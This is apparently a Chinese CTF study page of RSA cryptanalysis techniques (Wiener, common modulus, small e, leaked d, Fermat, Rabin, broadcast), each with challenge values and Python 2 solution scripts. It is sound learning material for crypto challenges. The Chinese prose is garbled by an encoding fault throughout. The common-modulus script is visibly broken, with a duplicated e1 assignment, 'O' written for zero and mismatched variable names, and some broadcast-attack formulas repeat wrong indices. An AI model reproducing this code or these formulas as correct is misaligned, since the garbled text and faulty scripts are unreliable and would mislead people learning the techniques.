</ul>
<h3 id="æå–N-e-amp-amp-ç§é’¥è§£å¯†"><a href="#æå–N-e-amp-amp-ç§é’¥è§£å¯†" class="headerlink" title="æå–N, e &amp;&amp; ç§é’¥è§£å¯†"></a>æå–N, e &amp;&amp; ç§é’¥è§£å¯†</h3><ul>
<li>ç»™å‡ºå…¬é’¥æå‰N,eï¼š</li>
</ul>
<pre><code>openssl rsa -pubin -text -modulus -in warmup -in pubkey.pem</code></pre>
<ul>
<li>ä½¿ç”¨ç§é’¥è§£å¯†å¯†æ–‡ï¼š</li>
</ul>
<pre><code>openssl rsautl -decrypt -in flag.enc -inkey private.pem -out flag.dec</code></pre>
<ul>
<li>ä»ceræ–‡ä»¶ä¸­å¯¼å‡ºpubkey.pemæ–‡ä»¶</li>
</ul>
<pre><code>openssl x509 -inform der -in SRL.cer -pubkey -noout &gt; rsa_public_key.pem</code></pre>
<h3 id="Toolsç³»åˆ—"><a href="#Toolsç³»åˆ—" class="headerlink" title="Toolsç³»åˆ—"></a>Toolsç³»åˆ—</h3><ul>
<li><a href="https://github.com/ohroot/rsatools">rsatools</a>(å…¬é’¥æå–n,e / ç”±p,qç”Ÿæˆç§é’¥)</li>
<li><a href="https://github.com/D001UM3/CTF-RSA-tool">CTF-RSA-tool</a>(åŠŸèƒ½ä¸°å¯Œçš„å·¥å…·é›†åˆ)</li>
</ul>
<h2 id="é¢˜å‹"><a href="#é¢˜å‹" class="headerlink" title="é¢˜å‹"></a>é¢˜å‹</h2><h3 id="Nè¿‡å°æ—¶"><a href="#Nè¿‡å°æ—¶" class="headerlink" title="Nè¿‡å°æ—¶"></a>Nè¿‡å°æ—¶</h3><p><strong>æ¡ä»¶ï¼š</strong>Nè¿‡å°æ—¶</p>
<p>å¯ä»¥ç›´æ¥çˆ†ç ´Nçš„å› å­ï¼Œä½†ä¸€èˆ¬çš„Néƒ½æ˜¯å¾ˆå¤§çš„ã€‚</p>
<pre><code class="python">N = 1211809

for i in range(2, N):
    if N % i == 0:
        print i</code></pre>
<h3 id="Wienerâ€™s-attack"><a href="#Wienerâ€™s-attack" class="headerlink" title="Wienerâ€™s attack"></a>Wienerâ€™s attack</h3><p><strong>æ¡ä»¶ï¼š</strong>é’ˆå¯¹dè¾ƒå°çš„æƒ…å†µä¸‹ï¼Œå¦‚æœç»™å‡ºçš„eå¾ˆå¤§ï¼Œé‚£ä¹ˆdä¸€èˆ¬ä¸å¤§ï¼Œå¯ä»¥ä½¿ç”¨è¯¥æ”»å‡»ã€‚</p>
<p>dçš„å¤§å°èŒƒå›´ï¼š         $d&lt;\frac{1}{3}N^{\frac{1}{4}}$    </p>
<p><a href="https://github.com/pablocelayes/rsa-wiener-attack">æ”»å‡»è„šæœ¬</a></p>
<p>ä¾‹å­ï¼šï¼ˆSCTF-ã€Šit may contain â€˜flagâ€™ã€‹ï¼‰</p>
<pre><code>n=0x1fb18fb44f4449f45ea938306c47b91f64b6c176bd24dbb35aa876f73859c90f0e1677d07430a1188176bc0b901ca7b01f6a99a7df3aec3dd41c3d80f0d17292e43940295b2aa0e8e5823ffcf9f5f448a289f2d3cb27366f907ee62d1aaeba490e892dc69dacbafa941ab7be809e1f882054e26add5892b1fcf4e9f1c443d93bf

e=0xe42a12145eaa816e2846200608080305c99468042450925789504307cbc54a20ed7071b68b067b703a1679d861795542f8cbd2d1cb4d3847d0940cac018cdb0fa729571afbe10c1b8be2dd8acd99ee48b77d53c435b9c2fed59e12e02ad8cfc2bcc46ad85534c266dcc1f3a1a03d87118eaf3f5b3eeeb3be84ad023a4bf34939

c=0xd19d63015bdcb0b61824237b5c67cb2ef09af0c6cd30e193ff9683357b1e45ab4df607b8c1e0b96cafc49a84d7e655c3ce0f71b1d217eec9ca6cdfa57dd3dc92533b79431aa8a7d6ca67ac9cdd65b178a5a96ab7ce7bf88440f4a9b9d10151b0c942a42fdab9ea2c2f0c3706e9777c91dcc9bbdee4b0fb7f5d3001719c1dd3d3
Tell me the msg.</code></pre>
<p>eå¾ˆå¤§ï¼Œæ‰€ä»¥då¾ˆå°ï¼Œå¯ä»¥ä½¿ç”¨Wienerâ€™s attackæ¥æ”»å‡»å¾—åˆ°dã€‚</p>
<p>æ”»å‡»å¾—åˆ°d=731297.</p>
<pre><code class="python">&gt;&gt;&gt; test_hack_RSA(n,e)
Hacked!
731297
&gt;&gt;&gt; d = 731297
&gt;&gt;&gt; flag = pow(c,d,n)
&gt;&gt;&gt; print hex(flag)[2:-1].decode(&#39;hex&#39;)
flag1sH3r3_d_ist0sma1l</code></pre>
<h3 id="å…±æ¨¡æ”»å‡»"><a href="#å…±æ¨¡æ”»å‡»" class="headerlink" title="å…±æ¨¡æ”»å‡»"></a>å…±æ¨¡æ”»å‡»</h3><p><strong>æ¡ä»¶ï¼š</strong></p>
<p>ç”¨ç›¸åŒçš„Nï¼Œä¸åŒçš„ç§é’¥ï¼ˆä¸åŒçš„eï¼‰åŠ å¯†åŒä¸€æ˜æ–‡mã€‚</p>
<p><strong>åŸç†ï¼š</strong></p>
<p>è®¾ä¸¤ä¸ªç”¨æˆ·çš„å…¬é’¥åˆ†åˆ«ä¸º $e_1$ å’Œ $e_2$ï¼Œä¸”ä¸¤è€…äº’è´¨ã€‚æ˜æ–‡æ¶ˆæ¯ä¸º $m$ï¼Œå¯†æ–‡åˆ†åˆ«ä¸ºï¼š</p>
<p>$ c_1 = m^{e_1}\bmod N $</p>
<p>$c_2 = m^{e_2}\bmod N $</p>
<p>å½“æ”»å‡»è€…æˆªè· $c_1$ å’Œ $c_2$ åï¼Œå°±å¯ä»¥æ¢å¤å‡ºæ˜æ–‡ã€‚ç”¨æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•æ±‚å‡º $re_1+se_2=1\bmod n$ çš„ä¸¤ä¸ªæ•´æ•° $r$ å’Œ $s$ï¼Œç”±æ­¤å¯å¾—ï¼š</p>
<p>$c_{1}^{r}c_{2}^{s} \equiv m^{re_1}m^{se_2}\bmod n\ \equiv m^{(re_1+se_2)} \bmod n\ \equiv m\bmod n$</p>
<pre><code class="python"># -*- coding:utf-8
from libnum import n2s, s2n
from gmpy2 import invert
n= raw_input( &quot;Input the n: &quot;)
e1 = raw_input( &quot; Input the e1:&quot;)
e1 = raw_input (&quot;Input the e2:&quot;)
def egcd(a, b) :
    if a == O:
        return (b , 0, 1)
    else:
        g,y,x=egcd(b%a,a)
        return (g, x - (b/1a)*y,y)
fo1 = open(&#39; flag.enc1&#39;,&#39;rb&#39; )
fo2 = open(&#39; flag.enc2&#39;, &#39;rb&#39;)
datafo1 = fo1.read( )
datafo2 = fo2.read( )
c1 = s2n(datafo1)
c2 = s2n(datafo2)
fo1.close()
fo2.close()
c2 = invert(c2, n)
S = egcd(e1, e2)
s1 = s[1]
s2 = s[2]
s2 = - s2
m = pow(c1, s1, n)*pow(c2, s2, n) % n
print n2s(m)</code></pre>
<blockquote>
<p><a href="http://www.bystudent.com/?p=236">RSAæ”»å‡»ä¹‹å…±æ¨¡æ”»å‡»[è½¬]</a></p>
</blockquote>
<h3 id="ä½åŠ å¯†æŒ‡æ•°æ”»å‡»ï¼ˆå°eï¼‰"><a href="#ä½åŠ å¯†æŒ‡æ•°æ”»å‡»ï¼ˆå°eï¼‰" class="headerlink" title="ä½åŠ å¯†æŒ‡æ•°æ”»å‡»ï¼ˆå°eï¼‰"></a>ä½åŠ å¯†æŒ‡æ•°æ”»å‡»ï¼ˆå°eï¼‰</h3><h4 id="çˆ†ç ´E"><a href="#çˆ†ç ´E" class="headerlink" title="çˆ†ç ´E"></a>çˆ†ç ´E</h4><p><strong>æ¡ä»¶ï¼š</strong>eå¾ˆå°æ—¶ï¼Œå¦‚æœmä¹Ÿä¸å¤§ï¼Œé‚£ä¹ˆmçš„eæ¬¡æ–¹ä»å°äºNï¼Œè¿™æ—¶æ¨¡Nç­‰äºåŸå€¼å³$c=m^e mod N=m^e$.</p>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥å¯¹cè¿›è¡Œeæ¬¡å¼€æ”¾çš„åˆ°æ˜æ–‡ã€‚</p>
<p>æ”»å‡»æ—¶å¯ä»¥é‡‡å–çˆ†ç ´çš„æ–¹å¼ã€‚åˆ¤æ–­æ¡ä»¶ï¼š<code>m**e==c</code></p>
<p>ä¾‹é¢˜ï¼š                         </p>
<pre><code class="python">import libnum
c=20007698782339834246219328724588364459038474898597431254441716723329047692482286669616878491497181438826429104573158490197780427343059002311390665150204203593904674308567972583524863664412573864470357485299378319457792659062998310715680020892095430469672971488726545126438904961637

n=127736277372703302601056543119422673263688414162130452012271136376613506149677023810059879551077756689012265602068781726322860263396788055341495459092641851239465778777954763378423777055786390661741851297248439205933852145044703803764388021585419049988085302710871206091591995497858682344782684500134395300049

for e in range(2,10):
    m = libnum.nroot(c,e)
    if m**e==c:
      break 
print &quot;e:&quot;,e
print &quot;m:&quot;,m
flag = libnum.n2s(m)
print flag</code></pre>
<h4 id="2-çŸ¥é“n-e-cï¼ˆå°eï¼‰"><a href="#2-çŸ¥é“n-e-cï¼ˆå°eï¼‰" class="headerlink" title="2.çŸ¥é“n,e,cï¼ˆå°eï¼‰"></a>2.çŸ¥é“n,e,cï¼ˆå°eï¼‰</h4><p>å› ä¸º$c=m^e(\bmod N)$,å·²çŸ¥æ¡ä»¶æ˜¯n,c,eï¼Œæ‰€ä»¥$m=\sqrt<a href="c+i*n">3</a>$.çˆ†ç ´içŸ¥é“å¾—åˆ°ä¸€ä¸ªåˆç†çš„æ•´æ•°mã€‚</p>
<p>ä¾‹å­ï¼šï¼ˆä»publickeyå¾—çŸ¥n,eï¼Œencå¾—çŸ¥cï¼‰</p>
<pre><code class="python">import gmpy2

c=116214698212458844423103857913441458442339925798599963213841797239355927303444100470558669928406921448510293928093943444789453829949079413240725018736039767923604391303528886458189412543467131343322985424830636686501183872258486468191992358327597581678299206152472529682824142608687221595323829204633224168225369759736250844323337223323791058404140581339609822071015073468035751326068998489516195665086364268852958930252474477661580751480498632203323212772718600

n=1953100985460341348696462250270875098931515807146586756296095446519328460202594322688077959911801412881736536007030245814199784734114468379391959242638228445246656155129859794350223734103552981321896683545886584718379382489138858499065228901412805708175575610007278296746952620830529848517741610397035368508736304074009571123132231492002047409382240786830369954266084929667038697671614351425836882238175963587766360974168461069129309445949172255481878016805287109

e = 3

for i in range(5):
    if gmpy2.iroot(c+i*n,3)[1] == True:        //æ˜¯å¦æˆåŠŸå¼€æ ¹
        m = gmpy2.iroot(c+i*n,3)[0]
        break
print i
print m</code></pre>
<h3 id="dæ³„éœ²æ”»å‡»"><a href="#dæ³„éœ²æ”»å‡»" class="headerlink" title="dæ³„éœ²æ”»å‡»"></a>dæ³„éœ²æ”»å‡»</h3><p>dæ³„æ¼åå¦‚æœæ¶ˆæ¯è¿˜æ˜¯ä½¿ç”¨è¯¥å¯†é’¥å¯¹åŠ å¯†çš„è¯æˆ‘ä»¬å¯ä»¥ç›´æ¥è§£å¯†æ¶ˆæ¯ï¼Œå¦‚æœdæ³„æ¼åæ›´æ¢äº†ä¸€ç»„ç”±æ–°çš„e2ç»„æˆçš„å¯†é’¥ï¼Œæ»¡è¶³è¯¥æ”»å‡»æ¡ä»¶ã€‚å‡è®¾åŸæ¥çš„dæˆ‘ä»¬å·²ç»çŸ¥é“ï¼ˆd1ï¼‰ï¼ŒNï¼Œe1æˆ‘ä»¬å¯ä»¥é€šè¿‡opensslæˆ–<a href="https://github.com/D001UM3/CTF-RSA-tool">RSA-Tools</a>æŸ¥çœ‹å…¬é’¥å¾—åˆ°ï¼Œç”±Nï¼Œd1ï¼Œe1æˆ‘ä»¬å¯ä»¥è®¡ç®—å‡ºpï¼Œqï¼Œæœ‰äº†pï¼Œqå’Œe2å¯ä»¥è®¡ç®—å‡ºd2.å°±å¯ä»¥è§£å¯†å•¦ã€‚</p>
<p><strong>ä¾‹é¢˜</strong>ï¼š<a href="https://github.com/nguyenqh/hitb-xctf-2017/tree/master/HackInTheCardII">2017 HITB - hack in the card II</a></p>
<blockquote>
<p>The second smart card sent to us has been added some countermeasures by that evil company. They also changed the public key(attachments -&gt; publickey.pem). However it seems that they missed somethingâ€¦â€¦<br>Can you decrypt the following hex-encoded ciphertext this time?</p>
<pre><code>016d1d26a470fad51d52e5f3e90075ab77df69d2fb39905fe634ded81d10a5fd10c35e1277035a9efabb66e4d52fd2d1eaa845a93a4e0f1c4a4b70a0509342053728e89e977cfb9920d5150393fe9dcbf86bc63914166546d5ae04d83631594703db59a628de3b945f566bdc5f0ca7bdfa819a0a3d7248286154a6cc5199b99708423d0749d4e67801dff2378561dd3b0f10c8269dbef2630819236e9b0b3d3d8910f7f7afbbed29788e965a732efc05aef3194cd1f1cff97381107f2950c935980e8954f91ed2a653c91015abea2447ee2a3488a49cc9181a3b1d44f198ff9f0141badcae6a9ae45c6c75816836fb5f331c7f2eb784129a142f88b4dc22a0a977</code></pre>
</blockquote>
<p> ä½¿ç”¨Â <code>openssl</code>Â æˆ–è€…<a href="https://github.com/D001UM3/CTF-RSA-tool">RSA-Tools</a>æŸ¥çœ‹Â <code>publickey.pem</code>Â çš„å…¬é’¥ï¼Œå‘ç°å®ƒçš„ N ä¸ä¸Šä¸€é“é¢˜çš„ N ç›¸åŒï¼Œå¹¶ä¸”ä¸Šé¢˜çš„ Nï¼Œeï¼Œd å·²çŸ¥ã€‚ç”±æ­¤å¯ç›´æ¥ä½¿ç”¨<a href="https://github.com/ius/rsatool">rsatool.py</a>å¾—åˆ° pï¼Œqï¼Œå¹¶é€šè¿‡æœ¬é¢˜çš„ e è®¡ç®—å‡º d å¾—åˆ°æ˜æ–‡ã€‚</p>
<pre><code class="python">#!/usr/bin/env python2    #ç”±n,d,eæ±‚è§£p,q
import fractions, random

def factor_modulus(n, d, e):
    t = (e * d - 1)
    s = 0
    while True:
        quotient, remainder = divmod(t, 2)
        if remainder != 0:
            break
        s += 1
        t = quotient
    found = False
    while not found:
        i = 1
        a = random.randint(1,n-1)
        while i &lt;= s and not found:
            c1 = pow(a, pow(2, i-1, n) * t, n)
            c2 = pow(a, pow(2, i, n) * t, n)
            found = c1 != 1 and c1 != (-1 % n) and c2 == 1
            i += 1
    p = fractions.gcd(c1-1, n)
    q = n // p
    return p, q


if __name__ == &#39;__main__&#39;:
    n=input(&quot;n:&quot;)
    d=input(&quot;d:&quot;)
    e=input(&quot;e:&quot;)
    p,q = factor_modulus(n,d,e)
    print p,q</code></pre>
<h3 id="æš´åŠ›åˆ†è§£-N"><a href="#æš´åŠ›åˆ†è§£-N" class="headerlink" title="æš´åŠ›åˆ†è§£ N"></a>æš´åŠ›åˆ†è§£ N</h3><p>åœ¨ N çš„æ¯”ç‰¹ä½æ•°å°äº 512 çš„æ—¶å€™ï¼Œå¯ä»¥é‡‡ç”¨å¤§æ•´æ•°åˆ†è§£çš„ç­–ç•¥è·å– p å’Œ qã€‚</p>
<p>å·¥å…·ï¼š<a href="http://factordb.com/">factordb</a>    <a href="https://github.com/DarkenCode/yafu">yafu</a></p>
<p><strong>ä¾‹é¢˜</strong>ï¼šï¼ˆJarvisOJ - Medium RSAï¼‰</p>
<blockquote>
<p>å·²çŸ¥ä¸€æ®µ RSA åŠ å¯†çš„ä¿¡æ¯ä¸ºï¼š0xdc2eeeb2782c ä¸”å·²çŸ¥åŠ å¯†æ‰€ç”¨çš„å…¬é’¥ï¼š N=322831561921859 e = 23 è¯·è§£å¯†å‡ºæ˜æ–‡ï¼Œæäº¤æ—¶è¯·å°†æ•°å­—è½¬åŒ–ä¸º ascii ç æäº¤ æ¯”å¦‚ä½ è§£å‡ºçš„æ˜æ–‡æ˜¯ 0x6162ï¼Œé‚£ä¹ˆè¯·æäº¤å­—ç¬¦ä¸² ab æäº¤æ ¼å¼ï¼š<code>PCTF&#123;æ˜æ–‡å­—ç¬¦ä¸²&#125;</code></p>
</blockquote>
<p>ç›´æ¥ä½¿ç”¨ factordb è¿›è¡Œåˆ†è§£,å¾—åˆ°ï¼š322831561921859=13574881Ã—23781539ï¼›pï¼Œqï¼Œeæœ‰äº†ï¼Œå¯ä»¥æ±‚dè¿›è¡Œè§£å¯†äº†ã€‚</p>
<pre><code class="python">import gmpy2
p = 13574881
q = 23781539
n = p * q
e = 23
c = 0xdc2eeeb2782c
phin = (p - 1) * (q - 1)
d = gmpy2.invert(e, phin)
p = gmpy2.powmod(c, d, n)
tmp = hex(p)
print tmp, tmp[2:].decode(&#39;hex&#39;)</code></pre>
<h3 id="p-q-å¾ˆå¤§æ—¶"><a href="#p-q-å¾ˆå¤§æ—¶" class="headerlink" title="|p-q| å¾ˆå¤§æ—¶"></a>|p-q| å¾ˆå¤§æ—¶</h3><p>|p-q| å¾ˆå¤§ï¼Œé‚£ä¹ˆpæˆ–qä¸€å®šè¾ƒå°ï¼Œå‡è®¾qè¾ƒå°ã€‚æˆ‘ä»¬å¯ä»¥ç©·ä¸¾qæ¥è¿›è¡Œçˆ†ç ´ã€‚</p>
<h3 id="p-q-è¾ƒå°æ—¶"><a href="#p-q-è¾ƒå°æ—¶" class="headerlink" title="|p-q| è¾ƒå°æ—¶"></a>|p-q| è¾ƒå°æ—¶</h3><p>|p-q| è¾ƒå°è¯´æ˜på’Œqæ¯”è¾ƒæ¥è¿‘ï¼Œä½¿ç”¨è´¹é©¬åˆ†è§£ã€‚</p>
<p>åŸç†ï¼š</p>
<p><img src="https://raw.githubusercontent.com/LANVNAL/LANVNAL.github.io/master/images/RSA/fermat.png" alt="format"></p>
<pre><code class="python">def fermat(n):
    a = isqrt(n)
    b2 = a * a - n
    b = isqrt(n)
    count = 0
    while b * b != b2:
        a = a + 1
        b2 = a * a - n
        b = isqrt(b2)
        count += 1
    p = a + b
    q = a - b
    assert n == p * q
    return p, q</code></pre>
<h3 id="Rabin-ç®—æ³•"><a href="#Rabin-ç®—æ³•" class="headerlink" title="Rabin ç®—æ³•"></a>Rabin ç®—æ³•</h3><p>Rabinç®—æ³•çš„ç‰¹å¾åœ¨äº<strong>e=2</strong>ï¼Œå¦‚æœä¸€ä¸ªé¢˜ç›®çš„e=2æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘å®ƒæ˜¯é‡‡ç”¨çš„rabinç®—æ³•</p>
<p><strong>æ”»å‡»åŸç†</strong></p>
<p>å¯†æ–‡ï¼š</p>
<p>$c=m^2,mod,n$</p>
<p>è§£å¯†ï¼š</p>
<ul>
<li><p>è®¡ç®—å‡º $m_p$ å’Œ $m_q$ï¼š</p>
<p>$m_p=\sqrt{c},mod,p$</p>
<p>$m_q=\sqrt{c},mod,q$</p>
</li>
<li><p>ç”¨æ‰©å±•æ¬§å‡ é‡Œå¾—è®¡ç®—å‡º $y_p$ å’Œ $y_q$ï¼š</p>
<p>$y_pâ‹…p+y_qâ‹…q=1$</p>
</li>
<li><p>è§£å‡ºå››ä¸ªæ˜æ–‡ï¼š</p>
<p>$a=(y_pâ‹…pâ‹…m_q+y_qâ‹…qâ‹…m_p),mod,n$</p>
<p>$b=nâˆ’a$</p>
<p>$c=(y_pâ‹…pâ‹…m_qâˆ’y_qâ‹…qâ‹…m_p),mod,n$</p>
<p>$d=nâˆ’c$</p>
</li>
</ul>
<p>æ³¨æ„ï¼šå¦‚æœ $pâ‰¡qâ‰¡3,(mod,4)$ï¼Œåˆ™</p>
<p>$m_p=c^{\frac{1}{4}(p+1)}modp$</p>
<p>$m_q=c^{\frac{1}{4}(q+1)},mod,q$</p>
<p>è€Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œ$pâ‰¡qâ‰¡3,(mod,4)$ æ˜¯æ»¡è¶³çš„ï¼Œå¯¹äºä¸æ»¡è¶³çš„æƒ…å†µä¸‹ï¼Œè¯·å‚è€ƒç›¸åº”çš„ç®—æ³•è§£å†³ã€‚</p>
<p><strong>ä¾‹é¢˜</strong>ï¼ˆ<a href="https://dn.jarvisoj.com/challengefiles/hardRSA.rar.b498edae4e73af8eb4567fb18117de46">hard RSA â€“ jarvis oj</a>ï¼‰</p>
<pre><code class="shell">~openssl rsa -pubin -in pubkey.pem -text -modulus
Public-Key: (256 bit)
Modulus:
    00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f:
    1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f:
    be:30:dd
Exponent: 2 (0x2)
Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD
writing RSA key
-----BEGIN PUBLIC KEY-----
MDowDQYJKoZIhvcNAQEBBQADKQAwJgIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDr
yigb/+l/vjDdAgEC
-----END PUBLIC KEY-----</code></pre>
<p>å‘ç°eä¸º2ï¼Œç»“åˆé¢˜ç›®æè¿°ï¼Œåº”ä¸ºrabinç®—æ³•ã€‚</p>
<p>åœ¨çº¿åˆ†è§£nå¾—åˆ°p,qï¼š</p>
<pre><code>p=275127860351348928173285174381581152299
q=319576316814478949870590164193048041239</code></pre>
<p>è§£é¢˜ä»£ç ï¼š(æ¥è‡ªctf-wiki)</p>
<pre><code class="python">#!/usr/bin/python
# coding=utf-8
import gmpy2
import string
from Crypto.PublicKey import RSA
import libnum

# è¯»å–å…¬é’¥å‚æ•°
with open(&#39;pubkey.pem&#39;, &#39;r&#39;) as f:
    key = RSA.importKey(f)
    N = key.n
    e = key.e
with open(&#39;flag.enc&#39;, &#39;r&#39;) as f:
    cipher = f.read().encode(&#39;hex&#39;)
    cipher = string.atoi(cipher, base=16)
    # print cipher
print &quot;please input p&quot;
p = int(raw_input(), 10)
print &#39;please input q&#39;
q = int(raw_input(), 10)
# è®¡ç®—ypå’Œyq
inv_p = gmpy2.invert(p, q)
inv_q = gmpy2.invert(q, p)

# è®¡ç®—mpå’Œmq
mp = pow(cipher, (p + 1) / 4, p)
mq = pow(cipher, (q + 1) / 4, q)

# è®¡ç®—a,b,c,d
a = (inv_p * p * mq + inv_q * q * mp) % N
b = N - int(a)
c = (inv_p * p * mq - inv_q * q * mp) % N
d = N - int(c)

for i in (a, b, c, d):
    print libnum.n2s(i)</code></pre>
<h3 id="Basic-Broadcast-Attackï¼ˆä½åŠ å¯†æŒ‡æ•°å¹¿æ’­æ”»å‡»ï¼‰"><a href="#Basic-Broadcast-Attackï¼ˆä½åŠ å¯†æŒ‡æ•°å¹¿æ’­æ”»å‡»ï¼‰" class="headerlink" title="Basic Broadcast Attackï¼ˆä½åŠ å¯†æŒ‡æ•°å¹¿æ’­æ”»å‡»ï¼‰"></a>Basic Broadcast Attackï¼ˆä½åŠ å¯†æŒ‡æ•°å¹¿æ’­æ”»å‡»ï¼‰</h3><p><strong>æ¡ä»¶ï¼š</strong>å¦‚æœä¸€ä¸ªç”¨æˆ·ä½¿ç”¨åŒä¸€ä¸ªåŠ å¯†æŒ‡æ•° e åŠ å¯†äº†åŒä¸€ä¸ªæ¶ˆæ¯ï¼Œå¹¶å‘é€ç»™äº†å…¶ä»– e ä¸ªç”¨æˆ·ã€‚ï¼ˆç›¸åŒçš„eï¼Œä¸åŒçš„Nï¼ŒåŒä¸€æ˜æ–‡ï¼‰</p>
<p><strong>åŸç†ï¼š</strong></p>
<p>mï¼Œeç›¸åŒï¼Œä¸åŒçš„æ˜¯cå’Œnï¼Œæ‰€ä»¥ï¼š</p>
<p>$c_1 \equiv m^e \mod n_1$     =&gt;     $ m^e\equiv c_1 \mod n_1$</p>
<p>$c_2 \equiv m^e \mod n_2$    =&gt;     $ m^e\equiv c_2 \mod n_1$</p>
<p>$c_3 \equiv m^e \mod n_3$     =&gt;     $ m^e\equiv c_3 \mod n_1$</p>
<p>â€¦ </p>
<p>$c_n \equiv m^e \mod n_n$    =&gt;     $ m^e\equiv c_3 \mod n_1$</p>
<p>ç”±ä¸­å›½å‰©ä½™å®šç†å¯å¾—ï¼š</p>
<p> $m^e \equiv C \mod n_1n_2n_3\cdot\cdot\cdot n_n$</p>
<p>å› ä¸º $n_1n_2n_3\cdot\cdot\cdot n_n$ æ¯”Cå¤§æ‰€ä»¥     $m^e \equiv C$</p>
<p>$C=c_1\cdot M_1\cdot t_1+ c_2\cdot M_2\cdot t_2 + â€¦ +c_n\cdot M_n\cdot t_n$    </p>
<p>$M_1 = n_2 \cdot n_3 \cdots \cdot n_n$    </p>
<p>$t_1 = M_1 \mod n_1$</p>
<p>æ‰€ä»¥mç›´æ¥å¯¹Cå¼€eæ¬¡æ–¹æ ¹å°±å¥½ã€‚</p>
<blockquote>
<p><a href="https://www.wikiwand.com/zh-hans/%E4%B8%AD%E5%9B%BD%E5%89%A9%E4%BD%99%E5%AE%9A%E7%90%86">ä¸­å›½å‰©ä½™å®šç†-ç»´åŸºç™¾ç§‘</a></p>
</blockquote>
<p><strong>ä¾‹é¢˜ï¼š</strong>ï¼ˆHCTF GAME è¿›å‡»çš„ Crypto [5]ï¼‰</p>
<p>é¢˜ç›®æè¿°ï¼š</p>
<pre><code>n is 17551188754807399016342420221734945766749930201727412345251590531404061480740932995199065332987719183197199448336435851015540272155441486746027315107821340969105623451575872580170978368650593880274076025520453956378539766228430429142117994616985318963125739076826635459215114946159348678398268099389525414431618517743889314085714390430972783223270985688988995257770363117225472590084489120958397189130958462784532637453482182763505791720641422686749616216521724012108378680177131928438795893866425040489551258902610047574579899692834984999209528110849342042529825594061894238371591910354584305136154355365191215400149
e is 10
c is 4675182605549711347653299514777826238559040200527747810846901991433127025723361807211672208052862870258047285285949212515664278410499603829663266213968511493974766674071825225536665267049044619340378438531615983696406305841945756396579371794826265549929503043134668360055027276522368879193620937457881486509311711905722483187734650127796510808637890189952840971330768913946884525594627652458745930532219238258911608744112001798136394806004726472890838481881026716605743812674350955258003794590748258523929460446986020794445478076559635145181909093786617716473870604463315696183050495143502762614767485881979217577416

ä¸ºäº†çœåœ°æ–¹çœç•¥äº†å¾ˆå¤šå¯¹è¿™æ ·çš„n,e,cå€¼ï¼Œä¸‹é¢ä»£ç ä¸­æœ‰å…¨éƒ¨n,e,c</code></pre>
<p>é¢˜è§£ï¼š</p>
<pre><code class="python">import gmpy

def my_parse_number(number):
    string = &quot;%x&quot; % number
    erg = []
    while string != &#39;&#39;:
        erg = erg + [chr(int(string[:2], 16))]
        string = string[2:]
    return &#39;&#39;.join(erg)

def e_gcd(a, b):
    x,y = 0, 1
    lastx, lasty = 1, 0
    while b:
        a, (q, b) = b, divmod(a,b)
        x, lastx = lastx-q*x, x
        y, lasty = lasty-q*y, y
    return (lastx, lasty, a)

def chinese_remainder_theorem(items):
  N = 1
  for a, n in items:
    N *= n

  result = 0
  for a, n in items:
    m = N/n
    r, s, d = e_gcd(n, m)
    if d != 1:
      raise &quot;Input not pairwise co-prime&quot;
    result += a*s*m

  return result % N, N

e=10

n=[17551188754807399016342420221734945766749930201727412345251590531404061480740932995199065332987719183197199448336435851015540272155441486746027315107821340969105623451575872580170978368650593880274076025520453956378539766228430429142117994616985318963125739076826635459215114946159348678398268099389525414431618517743889314085714390430972783223270985688988995257770363117225472590084489120958397189130958462784532637453482182763505791720641422686749616216521724012108378680177131928438795893866425040489551258902610047574579899692834984999209528110849342042529825594061894238371591910354584305136154355365191215400149,21840437284422601584177601857355845296420300157767339109572377640408362726674561246210400400760474187121246893712480109326893614162779470768415282900713800983815570602250068673695044749932532689851310770087552524620857623442019428044482787965428075984951982104920901562456426672111590909100736209153905853035127247720276974050404663847547090362780729077829594684995979457326414947449083219461617302643392904522733812903141301332227357689517880801845510579518887472928083718826890369016944549160461428710615747001273521253638766267143341819170249648385341127263707417642925464809788975715332938666417316695941347477577,30015914133986758133105015082922460910471726819000479872816812806794140887209294393963063273377891203069864711466776200108173672428779293308320460116493040572826915020654293929241843686728296387400110062099074573009645563520805301899962344680821396200256042478539540675850427377958553324581371362112652752444824919601767821622038488365501031636558236126052654241662743070651213369566898998898634441261811655053789384588711547685939927721116404429914329081432990913321296964957260691148704710581681774562904924080813274984809940008968629515304859518629473284018332651831587916402539386242421630250537030688162675751761,18009718435825445649372629634867772247035138229493108362713630947680338354227735572070882390378632440365163117094233413520107070581908224239210969172094402760924055334584259678276505919418191623762998249724248379302786621689049107500760348303940112840664926231345646325964133281550765454719628161600475143792567309947330130747860125557547051843620899629217636918002929846463097841539446014019579830347356084080488561917440356848465812937246809018168582635191619622041079012450531811237168105634382108634135880887093525611263186925213027913337454706919754923593714509998062073450679720905569489304398625255143801533277,27090736422393991189249636552945539144039087911497773160371557650625344533254580764344628540515132884576739746597729079146155130899009238110101654711303800340566538298798432929136509923129089904647023409146264405964139002638684510681372633714179570768685640570209727600215295330846361754314973731753734397312932947433225732597524076563605729037998272803472953079912899867244318073144564355326520230078681106746670895643454939714423661018216469020021429142336238301775948794784776906058601395026463842070755547793192470653204078222827768950823747061655106900276571547680451953562314376913592896427730473091360051391129,22277916445389799876692954866506052125036892596099795492064670519272419621528759837318253665292779127861537748967309681231938516330289846519214661138299205082421968922350230121526530080908053297879027158545040193774647350499415863211113776785399848472712293535289113810322398103983587423306282629848367328743089145940536913390664697321526306054579656600439140061667264516070003507841618352122567379038304294976725469305215682426898731699093794930417366769249256999177339843020364367769712776225743916112170787273891225926246407201080202593858063362565931942590349178361085396799890148505959437244983447934838792051793,20851005254704933958354817552975190588383962843827122226904964048318053243049822277049715505735762051530592940514007687138882551369906711787133432792478447465241409449145625470766867280545673313710877827491010966285871747638401315338616986782370641881615238434667687936400955629642629748987839996011550408156162317201139746453148874558603034756902297066835592748562014100033050736650359512497633206350878620421058840864178654150287452573363251543090733404389037241843869379543719804499640600546216051812575335078292203435075056740907356476508423562893159958041443951220933694064510275964264723600894558623421819904501,21745680718194037861694569863678082853797244380310200176477643943644